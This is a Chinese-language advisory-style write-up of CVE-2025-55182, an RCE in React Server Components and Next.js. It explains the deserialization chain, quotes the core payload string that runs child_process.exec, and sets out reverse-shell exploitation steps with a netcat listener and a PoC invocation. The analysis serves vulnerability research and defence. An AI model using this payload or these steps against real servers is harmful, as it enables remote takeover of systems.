## CVE-2025-55182 - React Server Components, Next.js 远程代码执行 (RCE), 原型链污染, 反序列化漏洞

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE), 原型链污染, 反序列化漏洞

**影响应用:** React Server Components, Next.js

**危害等级:** 严重

**CVSS评分:** 10.0

**影响版本:** Next.js 15.x, Next.js 16.x (未打补丁版本), react-server-dom-webpack

**利用条件:** 无需认证, 远程网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-55182，绰号“React2Shell”，是一个极其严重的远程代码执行（RCE）漏洞，其CVSS评分为10.0。该漏洞主要影响Next.js应用程序中使用的React服务器组件（RSC）。漏洞的核心在于React Flight反序列化机制在处理对象属性访问路径（如`__proto__`、`constructor`）时缺乏严格的校验。攻击者可以通过构造恶意的multipart表单，利用`$B`引用结合可控的`_response._prefix`和被劫持为`Function`的`_formData.get`，动态地在服务端生成包含任意系统命令的函数，并将其赋值给对象的`.then`属性。当此属性在特定条件下被触发时，即可导致任意系统命令的执行。根据威胁情报，该漏洞自2025年12月3日披露以来，已遭到大规模的实际利用，被安全圈称为“核弹级”漏洞。

**POC有效性分析:**
提供的Python POC代码`CVE-2025-55182-revshell.py`充分展示了该漏洞的利用链。该脚本首先获取目标URL和攻击者监听地址（LHOST:LPORT），接着定义了针对不同操作系统（Linux Bash, Linux Netcat, Windows PowerShell）的三种标准反向Shell payload。POC通过构造一个特殊的HTTP `POST`请求来执行攻击，目标路径为`/_next/static/chunks/react-flight`。请求体是一个`multipart/form-data`类型，其中一个关键部分是作为`0`字段值的精心构造的JSON-like字符串：`1{"__type":"Function","code":"global.process.mainModule.require('child_process').exec('{cmd}')"}`。这个字符串利用了RSC的序列化特性，在服务端动态地创建一个Function对象，其`code`属性包含了利用Node.js内置的`child_process.exec`模块执行系统命令的逻辑。`{cmd}`占位符会被替换为预定义的反向Shell命令。POC通过循环发送这三种payload，旨在确保在不同目标系统上都能尝试建立反向Shell连接。代码结构清晰，利用方式直接且高效，充分验证了该漏洞的远程代码执行能力。威胁情报中提到的广泛利用情况进一步确认了此POC的有效性和实际威胁。

**利用步骤:**
1.  **确认目标环境:** 验证目标网站是否运行着受影响的Next.js 15.x / 16.x版本（未打补丁）且使用了React服务器组件（RSC）。
2.  **准备监听器:** 在攻击者的机器上启动一个网络监听器，用于接收反向Shell连接。例如，使用`netcat`命令：`nc -lvnp <监听端口>` (例如 `nc -lvnp 4444`)。
3.  **执行POC脚本:** 运行提供的Python POC脚本，并传入目标URL以及攻击者的监听IP地址和端口。
    示例：`python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444`
    其中`https://vuln.example.com`是受攻击的目标URL，`10.10.14.66`是攻击者机器的IP地址，`4444`是监听端口。
4.  **接收反向Shell:** 脚本执行后，会自动向目标发送恶意请求。如果目标存在漏洞且未被网络安全设备（如WAF/IPS）阻拦，攻击者的监听器将收到一个来自目标服务器的反向Shell连接，从而获得目标服务器的命令执行权限。
5.  **验证:** 在监听器中确认是否已获得Shell，并尝试执行一些基本命令（如`whoami`，`ls`）以验证控制权。

**投毒风险分析:**
提供的POC代码`CVE-2025-55182-revshell.py`是专为防御性安全研究设计的，其投毒风险评估为**低**（5%）。该脚本的代码逻辑清晰，功能单一，其唯一目的是利用CVE-2025-55182漏洞在目标系统上获取反向Shell。具体分析如下：
1.  **代码透明度:** 脚本完全由Python编写，没有使用任何形式的代码混淆、加密或打包技术。所有函数和逻辑都以明文形式呈现，易于审计和理解。
2.  **依赖性:** 脚本仅依赖Python标准库（`sys`, `time`）和一个广泛使用的第三方库`requests`。`requests`库是一个功能成熟且经过严格审查的HTTP客户端库，本身不包含已知的恶意行为。
3.  **外部通信:** 除了向目标URL发送HTTP请求（这是漏洞利用的必要步骤）以及在利用成功后建立与攻击者指定监听地址的反向Shell连接（这是预期结果），脚本本身不进行任何其他的、未经授权的外部网络通信。它不会连接到未知或可疑的C2服务器，也不会泄露敏感数据。
4.  **系统交互:** 脚本对本地系统的交互非常有限，主要操作是执行Python解释器和调用`requests`库发送网络请求。它不会修改本地文件系统，不会尝试安装额外的软件、修改系统配置或收集和传输本地敏感信息。
5.  **恶意行为界定:** 脚本中涉及的“恶意”行为仅限于其构造的反向Shell payload。这些payload是漏洞利用的核心组成部分，其目的是在目标服务器上执行命令以建立通信通道，而非POC脚本自身包含隐藏的、非预期的恶意功能（即“投毒”）。
综上所述，该POC代码是纯粹的漏洞利用工具，不包含任何与利用目的无关的、具有投毒性质的恶意代码。用户可以放心地在受控环境中进行复现和研究，但应警惕其在非授权环境下的潜在危害。

**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
